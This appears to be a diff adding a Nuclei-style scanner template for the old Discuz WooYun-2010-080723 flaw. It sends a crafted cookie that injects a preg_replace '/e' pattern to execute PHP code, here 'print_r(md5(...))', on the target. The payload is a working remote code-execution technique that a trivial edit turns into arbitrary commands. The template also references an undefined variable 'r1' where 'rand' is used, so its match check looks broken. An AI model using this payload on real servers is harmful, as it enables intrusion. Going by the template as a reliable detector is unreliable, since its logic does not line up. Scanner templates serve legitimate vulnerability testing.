@@ -1,0 +1,33 @@
+id: poc-local-cms-xray-discuz-wooyun-2010-080723
+
+info:
+  name: poc-local-cms-xray-discuz-wooyun-2010-080723
+  author: capiton
+  severity: high
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+  tags: discuz
+
+
+variables:
+  rand: "{{rand_int(800000000, 1000000000)}}"
+  md5_rand: "{{md5(r1)}}"
+
+requests:
+  - raw:
+      - |
+        GET /viewthread.php?tid=10 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+
+    matchers-condition: and
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        words:
+          - "{{md5_rand}}"
